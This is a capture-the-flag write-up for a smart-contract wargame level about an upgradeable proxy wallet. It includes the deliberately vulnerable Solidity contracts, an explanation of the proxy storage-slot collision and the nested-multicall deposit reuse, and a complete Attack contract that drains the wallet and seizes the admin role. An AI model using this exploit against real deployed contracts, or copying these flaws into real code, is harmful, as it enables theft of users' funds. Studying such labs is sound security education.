## Challenge
~~~
Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

  You'll need to hijack this wallet to become the admin of the proxy.

  Things that might help:

- Understanding how `delegatecall` works and how `msg.sender` and `msg.value` behaves when performing one.
- Knowing about proxy patterns and the way they handle storage variables.
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```
`

## Solution

Storage slots between the proxy contract and the implementation contract are not aligned: 
`pendingAdmin -> owner`
`admin -> maxBalance`

`admin` cannot be changed because the `approveNewAdmin()` function is guarded by the `onlyAdmin` modifier
`pendingAdmin` can be changed via the `proposeNewAdmin()` function thus allowing us to execute the code in PuzzleWallet with `owner = pendingAdmin`

Since we can now execute the  code in PuzzleWallet with `owner = pendingAdmin`, we can execute `addToWhitelist()` and pass `onlyWhitelisted` check in other PuzzleWallet functions.

In order to become the admin we need to change the value stored at slot 1(admin at proxy contract or maxBalance in wallet contract). `setMaxBalance()` would do the work, but in order to execute it we need to pass the check `address(this).balance == 0`, but `deposit()` and `execute()` allows us to withdraw only what we have deposited. Then we need to somehow change the value of `balances[<our_address>]` which is used to check how much we have deposited.

Only function left is `multicall()` - it accepts `bytes` array with every element different call data. There is a check if deposit is called more than once - this is because we only send `msg.value` once and it should not be used multiple times to call the `deposit()` function since it would break the correlation between the real value deposited and the one marked in `balances`

For this reason we can call `multicall()` with array of multicall data which internally call the `deposit()` function.

EOA -> PuzzleProxy -> PuzzleWallet.multicall(\[multicall data\], \[multicall data\], \[multicall data\], \[multicall data\])
										|                       	|                       	|	      	                     |	
						multicall(deposit data)    multicall(deposit data)  multicall(deposit data)     multicall(deposit data)
						
with `delegatecall()` in `multicall()` the `msg.sender` and `msg.value` are preserved


```
interface IWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Attack {
    constructor(IWallet wallet) payable {
        // overwrite wallet owner
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        // deposit
        data[0] = deposit_data[0];
        // multicall -> deposit
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
        wallet.multicall{value: 0.001 ether}(data);

        // withdraw
        wallet.execute(msg.sender, 0.002 ether, "");

        // set admin
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(wallet.admin() == msg.sender, "hack failed");
        selfdestruct(payable(msg.sender));
    }
}

```

## Key takeaways and useful resources

[Smart Contract Programmer video about upgradeable proxy](https://www.youtube.com/watch?v=xluCHy_HB-4)

[OZ Proxy patterns article](https://blog.openzeppelin.com/proxy-patterns)